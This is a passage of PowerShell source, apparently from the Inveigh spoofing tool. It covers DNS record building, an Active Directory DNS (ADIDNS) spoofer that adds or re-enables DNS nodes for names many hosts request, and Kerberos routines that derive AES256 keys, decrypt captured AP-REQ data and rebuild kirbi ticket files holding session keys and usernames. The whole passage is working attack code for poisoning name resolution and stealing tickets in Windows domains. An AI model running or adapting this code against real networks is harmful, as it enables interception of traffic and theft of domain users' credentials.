                [Byte[]]$name_array += ($Name.Length - $name_start)
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }
            else
            {
                [Byte[]]$name_array = $Name.Length
                [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start))
            }

            return $name_array
        }

        switch ($Type)
        {

            'A'
            {
                [Byte[]]$DNS_type = 0x01,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes(($Data.Split(".")).Count))[0..1]
                [Byte[]]$DNS_data += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()
            }

            'AAAA'
            {
                [Byte[]]$DNS_type = 0x1c,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes(($Data -replace ":","").Length / 2))[0..1]
                [Byte[]]$DNS_data += ([System.Net.IPAddress][String]([System.Net.IPAddress]$Data)).GetAddressBytes()
            }
            
            'CNAME'
            {
                [Byte[]]$DNS_type = 0x05,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$DNS_data = $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }

            'DNAME'
            {
                [Byte[]]$DNS_type = 0x27,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$DNS_data = $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }
            
            'MX'
            {
                [Byte[]]$DNS_type = 0x0f,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 6))[0..1]
                [Byte[]]$DNS_data = [System.Bitconverter]::GetBytes($Preference)[1,0]
                $DNS_data += $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }

            'NS'
            {
                [Byte[]]$DNS_type = 0x02,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$DNS_data = $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }

            'PTR'
            {
                [Byte[]]$DNS_type = 0x0c,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 4))[0..1]
                [Byte[]]$DNS_data = $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }

            'SRV'
            {
                [Byte[]]$DNS_type = 0x21,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 10))[0..1]
                [Byte[]]$DNS_data = [System.Bitconverter]::GetBytes($Priority)[1,0]
                $DNS_data += [System.Bitconverter]::GetBytes($Weight)[1,0]
                $DNS_data += [System.Bitconverter]::GetBytes($Port)[1,0]
                $DNS_data += $Data.Length + 2
                $DNS_data += ($Data.Split(".")).Count
                $DNS_data += New-DNSNameArray $Data
                $DNS_data += 0x00
            }

            'TXT'
            {
                [Byte[]]$DNS_type = 0x10,0x00
                [Byte[]]$DNS_length = ([System.BitConverter]::GetBytes($Data.Length + 1))[0..1]
                [Byte[]]$DNS_data = $Data.Length
                $DNS_data += [System.Text.Encoding]::UTF8.GetBytes($Data)
            }

        }
        
        [Byte[]]$DNS_TTL = [System.BitConverter]::GetBytes($TTL)
        [Byte[]]$DNS_record = $DNS_length +
            $DNS_type +
            0x05,0xF0,0x00,0x00 +
            $SOASerialNumberArray[0..3] +
            $DNS_TTL[3..0] +
            0x00,0x00,0x00,0x00

        if($Static)
        {
            $DNS_record += 0x00,0x00,0x00,0x00
        }
        else
        {
            $timestamp = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
            $timestamp = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($timestamp))
            $timestamp = $timestamp.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
            $timestamp = $timestamp[0..3]
            $DNS_record += $timestamp
        }
        
        $DNS_record += $DNS_data

        return ,$DNS_record
    }

    function Invoke-ADIDNSSpoofer
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Forest,
            [parameter(Mandatory=$true)][String]$Node,
            [parameter(Mandatory=$false)][String]$Partition,
            [parameter(Mandatory=$false)][String]$Type,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        try
        {
            $node_added = New-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone

            if($inveigh.ADIDNS -and !$node_added)
            {
                $node_tombstoned = Get-ADIDNSNodeTombstoned -Credential $Credential -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Zone $Zone

                if($node_tombstoned)
                {
                    Enable-ADIDNSNode -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Node $Node -Partition $Partition -Type $Type -TTL $TTL -Zone $Zone
                }

            }

        }
        catch
        {
            $error_message = $_.Exception.Message
            $error_message = $error_message -replace "`n",""
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
            $inveigh.ADIDNS = $null
        }

    }

    function Invoke-ADIDNSCheck
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][Array]$Ignore,
            [parameter(Mandatory=$false)][String]$Data,
            [parameter(Mandatory=$false)][String]$Domain,
            [parameter(Mandatory=$false)][String]$DomainController,
            [parameter(Mandatory=$false)][String]$Forest,
            [parameter(Mandatory=$false)]$Partition,
            [parameter(Mandatory=$false)][String]$Zone,
            [parameter(Mandatory=$false)][Int]$Threshold,
            [parameter(Mandatory=$false)][Int]$TTL,
            [parameter(Mandatory=$false)]$RequestTable,
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
        )

        Start-Sleep -S 1

        foreach($request in $RequestTable.Keys)
        {

            if(($RequestTable.$request | Sort-Object -Unique).Count -gt $Threshold)
            {

                if(!$inveigh.ADIDNS_table.ContainsKey($request))
                {
                    $inveigh.ADIDNS_table.Add($request,"")
                }
                
                if($Ignore -NotContains $request -and !$inveigh.ADIDNS_table.$request)
                {    
                    Invoke-ADIDNSSpoofer -Credential $Credential -Data $Data -Domain $Domain -DomainController $DomainController -Forest $Forest -Node $request -Partition $Partition -Type 'A' -TTL $TTL -Zone $Zone
                }
                elseif($Ignore -Contains $request)
                {

                    if(!$inveigh.ADIDNS_table.$request)
                    {
                        $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $request") > $null
                        $inveigh.ADIDNS_table.$request = 3
                    }

                }

            }
            
            Start-Sleep -m 10
        }

    }

}

# Kerberos Functions ScriptBlock
$kerberos_functions_scriptblock = 
{

    function Get-KerberosAES256BaseKey
    {
        param([String]$salt,[System.Security.SecureString]$password)

        $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
        $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)
        [Byte[]]$salt = [System.Text.Encoding]::UTF8.GetBytes($salt)
        [Byte[]]$password_cleartext = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)
        $constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
        $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_cleartext,$salt,4096)
        Remove-Variable password_cleartext
        $PBKDF2_key = $PBKDF2.GetBytes(32)
        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::None
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $PBKDF2_key
        $AES_encryptor = $AES.CreateEncryptor()
        $base_key_part_1 = $AES_encryptor.TransformFinalBlock($constant,0,$constant.Length)
        $base_key_part_2 = $AES_encryptor.TransformFinalBlock($base_key_part_1,0,$base_key_part_1.Length)
        $base_key = $base_key_part_1[0..15] + $base_key_part_2[0..15]

        return $base_key
    }

    function Get-KerberosAES256UsageKey
    {
        param([String]$key_type,[Int]$usage_number,[Byte[]]$base_key)

        $padding = 0x00 * 16

        if($key_type -eq 'checksum')
        {
            switch($usage_number) 
            {
                25 {[Byte[]]$usage_constant = 0x5d,0xfb,0x7d,0xbf,0x53,0x68,0xce,0x69,0x98,0x4b,0xa5,0xd2,0xe6,0x43,0x34,0xba + $padding}
            }
        }
        elseif($key_type -eq 'encrypt')
        {

            switch($usage_number) 
            {
                1 {[Byte[]]$usage_constant = 0xae,0x2c,0x16,0x0b,0x04,0xad,0x50,0x06,0xab,0x55,0xaa,0xd5,0x6a,0x80,0x35,0x5a + $padding}
                2 {[Byte[]]$usage_constant = 0xb5,0xb0,0x58,0x2c,0x14,0xb6,0x50,0x0a,0xad,0x56,0xab,0x55,0xaa,0x80,0x55,0x6a + $padding}
                3 {[Byte[]]$usage_constant = 0xbe,0x34,0x9a,0x4d,0x24,0xbe,0x50,0x0e,0xaf,0x57,0xab,0xd5,0xea,0x80,0x75,0x7a + $padding}
                4 {[Byte[]]$usage_constant = 0xc5,0xb7,0xdc,0x6e,0x34,0xc7,0x51,0x12,0xb1,0x58,0xac,0x56,0x2a,0x80,0x95,0x8a + $padding}
                7 {[Byte[]]$usage_constant = 0xde,0x44,0xa2,0xd1,0x64,0xe0,0x51,0x1e,0xb7,0x5b,0xad,0xd6,0xea,0x80,0xf5,0xba + $padding}
                11 {[Byte[]]$usage_constant = 0xfe,0x54,0xaa,0x55,0xa5,0x02,0x52,0x2f,0xbf,0x5f,0xaf,0xd7,0xea,0x81,0x75,0xfa + $padding}
                12 {[Byte[]]$usage_constant = 0x05,0xd7,0xec,0x76,0xb5,0x0b,0x53,0x33,0xc1,0x60,0xb0,0x58,0x2a,0x81,0x96,0x0b + $padding}
                14 {[Byte[]]$usage_constant = 0x15,0xe0,0x70,0xb8,0xd5,0x1c,0x53,0x3b,0xc5,0x62,0xb1,0x58,0xaa,0x81,0xd6,0x2b + $padding}
            }
                
        }
        elseif($key_type -eq 'integrity') 
        {
            
            switch($usage_number) 
            {
                1 {[Byte[]]$usage_constant = 0x5b,0x58,0x2c,0x16,0x0a,0x5a,0xa8,0x05,0x56,0xab,0x55,0xaa,0xd5,0x40,0x2a,0xb5 + $padding}
                4 {[Byte[]]$usage_constant = 0x72,0xe3,0xf2,0x79,0x3a,0x74,0xa9,0x11,0x5c,0xae,0x57,0x2b,0x95,0x40,0x8a,0xe5 + $padding}
                7 {[Byte[]]$usage_constant = 0x8b,0x70,0xb8,0xdc,0x6a,0x8d,0xa9,0x1d,0x62,0xb1,0x58,0xac,0x55,0x40,0xeb,0x15 + $padding}
                11 {[Byte[]]$usage_constant = 0xab,0x80,0xc0,0x60,0xaa,0xaf,0xaa,0x2e,0x6a,0xb5,0x5a,0xad,0x55,0x41,0x6b,0x55 + $padding}
            }

        }

        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $base_key
        $AES_encryptor = $AES.CreateEncryptor()
        $usage_key = $AES_encryptor.TransformFinalBlock($usage_constant,0,$usage_constant.Length)

        return $usage_key
    }

    function Get-ASN1Length
    {
        param ([Byte[]]$asn1)
    
        $i = 0
    
        while ($asn1[$i] -ne 3 -and $asn1[$i] -ne 129 -and $asn1[$i] -ne 130 -and $asn1[$i] -ne 131 -and $asn1[$i] -ne 132 -and $i -lt 1)
        {
            $i++   
        }
    
        switch ($asn1[$i]) 
        {
            
            3
            { 
                $i += 3 
                $length = $asn1[$i]
                $i++
            }
    
            129
            {
                $i += 1
                $length = $asn1[$i]
                $i++
            }
    
            130
            {
                $i += 2
                $length = Get-UInt16DataLength 0 $asn1[($i)..($i - 1)]
                $i++
            }
    
            131
            {
                $i += 3
                $length = Get-UInt32DataLength 0 ($asn1[($i)..($i - 2)] + 0x00)
                $i++
            }
    
            132
            {
                $i += 4
                $length = Get-UInt32DataLength 0 $asn1[($i)..($i - 3)]
                $i++
            }
    
        }
    
        return $i,$length
    }

    function Unprotect-Kerberos
    {
        param([Byte[]]$ke_key,[Byte[]]$encrypted_data)

        $final_block_length = [Math]::Truncate($encrypted_data.Count % 16)
        [Byte[]]$final_block = $encrypted_data[($encrypted_data.Count - $final_block_length)..$encrypted_data.Count]
        [Byte[]]$penultimate_block = $encrypted_data[($encrypted_data.Count - $final_block_length - 16)..($encrypted_data.Count - $final_block_length - 1)]
        $AES = New-Object "System.Security.Cryptography.AesManaged"
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $AES.IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
        $AES.KeySize = 256
        $AES.Key = $ke_key
        $AES_decryptor = $AES.CreateDecryptor()
        $penultimate_block_cleartext = $AES_decryptor.TransformFinalBlock($penultimate_block,0,$penultimate_block.Length)
        [Byte[]]$final_block_padding = $penultimate_block_cleartext[$final_block_length..$penultimate_block_cleartext.Count]
        $final_block += $final_block_padding
        [Byte[]]$cts_encrypted_data = $encrypted_data[0..($encrypted_data.Count - $final_block_length - 17)] + $final_block + $penultimate_block
        [Byte[]]$cleartext = $AES_decryptor.TransformFinalBlock($cts_encrypted_data,0,$cts_encrypted_data.Length)

        return $cleartext
    }

    function Get-Kirbi
    {
        param([Byte[]]$kirbi2,[Byte[]]$kirbi3)
    
        [Byte[]]$kirbi = $kirbi2 + $kirbi3
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0x76,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
    
        return $kirbi
    }
    function Get-KirbiPartTwo
    {
        param([Byte[]]$cleartext)
    
        $ASN1 = Get-ASN1Length $cleartext[4..9]
        $ASN1_length = $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]
        $ASN1_length += $ASN1[0]
        $realm_length = $cleartext[($ASN1_length + 7)]
        $username_length = $cleartext[($ASN1_length + $realm_length + 22)]
        $field_length = $realm_length + $username_length
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $pvno = $cleartext[($ASN1_length + $field_length + 73)]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 74)..($ASN1_length + $field_length + 79)]
        $ASN1_length += $ASN1[0]
        $tkt_vno = $cleartext[($ASN1_length + $field_length + 73)]
        $realm2_length = $cleartext[($ASN1_length + $field_length + 75)]
        [Byte[]]$realm2 = $cleartext[($ASN1_length + $field_length + 76)..($ASN1_length + $field_length + $realm2_length + 75)]
        $field_length += $realm2_length
        $sname_string_length = $cleartext[($ASN1_length + $field_length + 88)]
        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $sname_string_length + 88)]
        $field_length += $sname_string_length
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $kvno = $cleartext[($ASN1_length + $field_length + 88)]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + 94)]
        $ASN1_length += $ASN1[0]
        $cipher_length = $ASN1[1]
        [Byte[]]$cipher = $cleartext[($ASN1_length + $field_length + 89)..($ASN1_length + $field_length + $cipher_length + 88)]
        [Byte[]]$kirbi = 0x04,0x82 + [System.BitConverter]::GetBytes($cipher.Count)[1..0] + $cipher
        $kirbi = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12,0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $kvno + $kirbi
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string
        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi2
        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($realm2.Count)[3..0] + $realm2
        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $tkt_vno + $kirbi3
        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x61,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0xA1,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x16 + $kirbi4
        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01 + $pvno + $kirbi4
    
        return $kirbi4
    }
    
    function Get-KirbiPartThree
    {
        param([Byte[]]$cleartext)
    
        $ASN1 = Get-ASN1Length $cleartext[0..($ASN1_length + 5)]
        $ASN1_length = $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
        $ASN1_length += $ASN1[0]
        $ASN1 = Get-ASN1Length $cleartext[$ASN1_length..($ASN1_length + 5)]
        $ASN1_length += $ASN1[0]
        [Byte[]]$key = $cleartext[($ASN1_length + 11)..($ASN1_length + 44)]
        $prerealm_length = $cleartext[($ASN1_length + 46)]
        [Byte[]]$prerealm = $cleartext[($ASN1_length + 47)..($ASN1_length + $prerealm_length + 46)]
        $pname_length = $cleartext[($ASN1_length + $prerealm_length + 59)]
        $field_length = $prerealm_length + $pname_length
        [Byte[]]$pname = $cleartext[($ASN1_length + $prerealm_length + 60)..($ASN1_length + $field_length + 59)]
        [Byte[]]$flags = $cleartext[($ASN1_length + $field_length + 65)..($ASN1_length + $field_length + 68)]
        [Byte[]]$starttime = $cleartext[($ASN1_length + $field_length + 71)..($ASN1_length + $field_length + 87)]
        [Byte[]]$endtime = $cleartext[($ASN1_length + $field_length + 90)..($ASN1_length + $field_length + 106)]
        [Byte[]]$renew_till = $cleartext[($ASN1_length + $field_length + 109)..($ASN1_length + $field_length + 125)]
        $srealm_length = $cleartext[($ASN1_length + $field_length + 127)]
        [Byte[]]$srealm = $cleartext[($ASN1_length + $field_length + 128)..($ASN1_length + $field_length + $srealm_length + 127)]
        $field_length += $srealm_length
        $sname_string_length = $cleartext[($ASN1_length + $field_length + 140)]
        [Byte[]]$sname_string = $cleartext[($ASN1_length + $field_length + 141)..($ASN1_length + $field_length + $sname_string_length + 140)]
        [Byte[]]$kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($sname_string.Count)[3..0] + $sname_string
        $kirbi = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x02 + $kirbi
        $kirbi = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA9,0x84 + [System.BitConverter]::GetBytes($kirbi.Count)[3..0] + $kirbi
        $kirbi = 0xA8,0x84 + [System.BitConverter]::GetBytes($srealm.Count)[3..0] + $srealm + $kirbi
        $kirbi = 0xA7,0x84 + [System.BitConverter]::GetBytes($renew_till.Count)[3..0] + $renew_till + $kirbi
        $kirbi = 0xA6,0x84 + [System.BitConverter]::GetBytes($endtime.Count)[3..0] + $endtime + $kirbi
        $kirbi = 0xA5,0x84 + [System.BitConverter]::GetBytes($starttime.Count)[3..0] + $starttime + $kirbi
        $kirbi = 0xA3,0x84,0x00,0x00,0x00,0x07,0x03,0x05,0x00 + $flags + $kirbi
        [Byte[]]$kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($pname.Count)[3..0] + $pname
        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        $kirbi2 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x01 + $kirbi2
        $kirbi2 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        $kirbi2 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi2.Count)[3..0] + $kirbi2
        $kirbi2 = 0xA1,0x84 + [System.BitConverter]::GetBytes($prerealm.Count)[3..0] + $prerealm + $kirbi2
        [Byte[]]$kirbi3 = 0xA1,0x84 + [System.BitConverter]::GetBytes($key.Count)[3..0] + $key
        $kirbi3 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x12 + $kirbi3
        $kirbi3 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3
        $kirbi3 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi3.Count)[3..0] + $kirbi3
        [Byte[]]$kirbi4 = $kirbi3 + $kirbi2 + $kirbi
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0xA0,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x7D,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0x04,0x82 + [System.BitConverter]::GetBytes($kirbi4.Count)[1..0] + $kirbi4
        $kirbi4 = 0xA2,0x84 + [System.BitConverter]::GetBytes($kirbi4.Count)[3..0] + $kirbi4
        $kirbi4 = 0xA0,0x84,0x00,0x00,0x00,0x03,0x02,0x01,0x00 + $kirbi4
        $kirbi4 = 0x30,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4
        $kirbi4 = 0xA3,0x84 + [System.BitConverter]::GetBytes($kirbi4.count)[3..0] + $kirbi4
    
        return $kirbi4
    }

    function New-KerberosKirbi
    {
        param([Byte[]]$data,[Byte[]]$base_key,[String]$service,[String]$service_port,[String]$session)

        $apreq_converted = [System.BitConverter]::ToString($data)
        $apreq_converted = $apreq_converted -replace "-",""
        $ASN1_index = $apreq_converted.IndexOf("A003020112A1030201")

        if($ASN1_index -ge 0)
        {
            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 10)..($ASN1_index / 2 + 15)]
            $ASN1_length = $ASN1[0]
            $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + 15)]
            $ASN1_length += $ASN1[0]
            $cipher_length = $ASN1[1]
            [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 10)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 9)]
            [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 2 $base_key
            [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
            $cleartext = $cleartext[16..$cleartext.Count]
            $cleartext_converted = [System.BitConverter]::ToString($cleartext)
            $cleartext_converted = $cleartext_converted -replace "-",""
            $ASN1_index = $cleartext_converted.IndexOf("A003020112A1")

            if($ASN1_index -ge 0)
            {
                [Byte[]]$session_key = $cleartext[30..61]
                [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 11 $session_key
                $ASN1_index = $apreq_converted.IndexOf("A003020112A2")

                if($ASN1_index -ge 0)
                {
                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
                    $ASN1_length = $ASN1[0]
                    $ASN1 = Get-ASN1Length $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
                    $ASN1_length += $ASN1[0]
                    $cipher_length = $ASN1[1]
                    [Byte[]]$cipher = $data[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + $cipher_length + 4)]
                    [Byte[]]$cleartext = Unprotect-Kerberos $ke_key $cipher[0..($cipher.Count - 13)]
                    [Byte[]]$ke_key = Get-KerberosAES256UsageKey encrypt 14 $session_key
                    $cleartext = $cleartext[16..$cleartext.Count]
                    [Byte[]]$kirbi2 = Get-KirbiPartTwo $cleartext
                    $ASN1 = Get-ASN1Length $cleartext[4..9]
                    $ASN1_length = $ASN1[0]
                    $ASN1 = Get-ASN1Length $cleartext[($ASN1_length + 4)..($ASN1_length + 9)]
                    $ASN1_length += $ASN1[0]
                    $realm_length = $cleartext[($ASN1_length + 7)]
                    $realm = Convert-DataToString 0 $realm_length $cleartext[($ASN1_length + 8)..($ASN1_length + $realm_length + 7)]
                    $username_length = $cleartext[($ASN1_length + $realm_length + 22)]
                    $username = Convert-DataToString 0 $username_length $cleartext[($ASN1_length + $realm_length + 23)..($ASN1_length + $realm_length + $username_length + 22)]
                    $cleartext_converted = [System.BitConverter]::ToString($cleartext)
                    $cleartext_converted = $cleartext_converted -replace "-",""
                    $ASN1_index = $cleartext_converted.IndexOf("A003020112A2")

                    if($ASN1_index -ge 0)
                    {
                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + 5)..($ASN1_index / 2 + 10)]
                        $ASN1_length = $ASN1[0]
                        $ASN1 = Get-ASN1Length $cleartext[($ASN1_index / 2 + $ASN1_length + 5)..($ASN1_index / 2 + $ASN1_length + 10)]
                        $ASN1_length += $ASN1[0]
                        $cipher_length = $ASN1[1]
